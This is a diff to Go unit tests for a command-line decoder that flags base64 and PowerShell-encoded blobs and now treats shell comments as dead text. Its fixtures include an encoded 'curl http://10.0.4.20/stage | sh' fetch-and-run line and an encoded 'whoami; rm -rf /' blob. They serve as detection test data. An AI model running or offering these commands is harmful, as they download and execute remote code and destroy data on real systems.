@@ -79,6 +79,14 @@ func TestDecodeCommandLine(t *testing.T) {
 		{"sh reads # opening a word as a comment to the end of the line, operators included", `/bin/sh -c "echo # && pwsh -e ZQBjAGgAbwA="`, "", ""},
 		{"a # inside a word is text", `/bin/sh -c "echo a#b && pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
 		{"a line continuation vanishes before # is read, so the comment holds", "/bin/echo \\\n# && pwsh -e ZQBjAGgAbwA=", "", ""},
+		{"a blob PowerShell was given inside a comment gets no bare-base64 reading either", `/bin/sh -c "echo # && pwsh -e d2hvYW1pOyBybSAtcmYgLw=="`, "", ""},
+		{"a comment glued to an operator", `/bin/sh -c "echo;# && pwsh -e d2hvYW1pOyBybSAtcmYgLw=="`, "", ""},
+		{"a # inside a quoted word is not a comment, and the blob after it still decodes", `sh -c "echo 'step #1'; echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
+		{"words on later lines after a comment are not read as PowerShell's", "/bin/sh -c 'echo # heading\npwsh -nop\n-e ZQBjAGgAbwA='", "", ""},
+		{"a comment with an operator that runs onto the next line stays a comment", "/bin/sh -c 'echo done # || powershell -enc ZQBjAGgAbwA=\nexit 0'", "", ""},
+		{"a blob in a comment of a live command is never read", `/bin/sh -c "echo # Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g="`, "", ""},
+		{"a comment after PowerShell's switch is not its value", `/bin/sh -c "pwsh -e # Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g="`, "", ""},
+		{"a comment that mentions a live blob does not hide it", `sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh # was: Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g=,"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
 		{"an empty flagged token flags nothing, so a shell blob on the line still decodes", `powershell -e "" & sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
 		{"sh escapes a quote inside double quotes, so the operator is data", `/bin/sh -c "echo \"a & pwsh -e ZQBjAGgAbwA=\""`, "", ""},
 		{"an escaped space in a POSIX path", `/opt/my\ tools/pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
@@ -158,8 +166,13 @@ func TestRender_DecodedBesideTheOriginal(t *testing.T) {
 // readings and the first that yields PowerShell wins, so one invocation is
 // found once.
 func TestPowerShellEncodedArguments_OneReadingPerCmd(t *testing.T) {
-	if got := powerShellEncodedArguments(`cmd /c "powershell" -enc ZQBjAGgAbwA=`); len(got) != 1 {
-		t.Errorf("flagged tokens = %q; want one", got)
+	if live, dead := powerShellEncodedArguments(`cmd /c "powershell" -enc ZQBjAGgAbwA=`); len(live) != 1 || len(dead) != 0 {
+		t.Errorf("flagged tokens = %q dead %q; want one live", live, dead)
+	}
+	// A comment is dead: its long words are flagged, so no other reading
+	// claims them, and nothing is decoded from them.
+	if live, dead := powerShellEncodedArguments(`/bin/sh -c "echo;# && pwsh -e d2hvYW1pOyBybSAtcmYgLw=="`); len(live) != 0 || len(dead) != 1 || dead[0] != "d2hvYW1pOyBybSAtcmYgLw==" {
+		t.Errorf("flagged tokens = %q dead %q; want the blob dead", live, dead)
 	}
 }
 
@@ -236,25 +249,34 @@ func TestSplitCommands(t *testing.T) {
 		line string
 		sh   shell
 		want []string
+		dead []bool // per command, when any is
 	}{
-		{`whoami&&powershell -e X | more`, windowsShell, []string{"whoami", "powershell -e X", "more"}},
-		{`echo "a & b" & echo 'c & d' ^& e`, windowsShell, []string{`echo "a & b"`, `echo 'c`, `d' ^& e`}},
-		{`echo "a & b" ; echo 'c ; d' \; e`, posixShell, []string{`echo "a & b"`, `echo 'c ; d' \; e`}},
-		{`echo "a \" & b" ; c`, posixShell, []string{`echo "a \" & b"`, `c`}},
-		{`cmd /c echo \"x & y`, windowsShell, []string{`cmd /c echo \"x & y`}},
-		{"echo \\\n# a && b", posixShell, []string{"echo \\"}}, // the text stays verbatim; tokenize removes the continuation
-		{"echo a#b | c # d | e", posixShell, []string{"echo a#b", "c"}},
-		{"echo a # b & c", windowsShell, []string{"echo a # b", "c"}},
-		{``, windowsShell, nil},
+		{`whoami&&powershell -e X | more`, windowsShell, []string{"whoami", "powershell -e X", "more"}, nil},
+		{`echo "a & b" & echo 'c & d' ^& e`, windowsShell, []string{`echo "a & b"`, `echo 'c`, `d' ^& e`}, nil},
+		{`echo "a & b" ; echo 'c ; d' \; e`, posixShell, []string{`echo "a & b"`, `echo 'c ; d' \; e`}, nil},
+		{`echo "a \" & b" ; c`, posixShell, []string{`echo "a \" & b"`, `c`}, nil},
+		{`cmd /c echo \"x & y`, windowsShell, []string{`cmd /c echo \"x & y`}, nil},
+		// A comment is a dead command of its own, as is what begins inside it,
+		// however far a segment runs on. The text stays verbatim, continuation
+		// included; tokenize removes the continuation.
+		{"echo \\\n# a && b", posixShell, []string{"echo \\", "# a", "b"}, []bool{false, true, true}},
+		{"echo a#b | c # d | e", posixShell, []string{"echo a#b", "c", "# d", "e"}, []bool{false, false, true, true}},
+		{"echo;# x\ny && z", posixShell, []string{"echo", "# x\ny", "z"}, []bool{false, true, false}},
+		{"echo # || a\nb", posixShell, []string{"echo", "#", "a\nb"}, []bool{false, true, true}},
+		{"echo a # b & c", windowsShell, []string{"echo a # b", "c"}, []bool{false, false}},
+		{``, windowsShell, nil, nil},
 	}
 	for _, c := range cases {
 		got := splitCommands(c.line, c.sh)
 		if !eq(cmds(got), c.want) {
 			t.Errorf("%q: = %q; want %q", c.line, cmds(got), c.want)
 		}
-		for _, g := range got {
+		for i, g := range got {
 			if c.line[g.start:g.start+len(g.text)] != g.text {
 				t.Errorf("%q: offset of %q wrong", c.line, g.text)
+			}
+			if c.dead != nil && i < len(c.dead) && g.dead != c.dead[i] {
+				t.Errorf("%q: %q dead = %v; want %v", c.line, g.text, g.dead, c.dead[i])
 			}
 		}
 	}
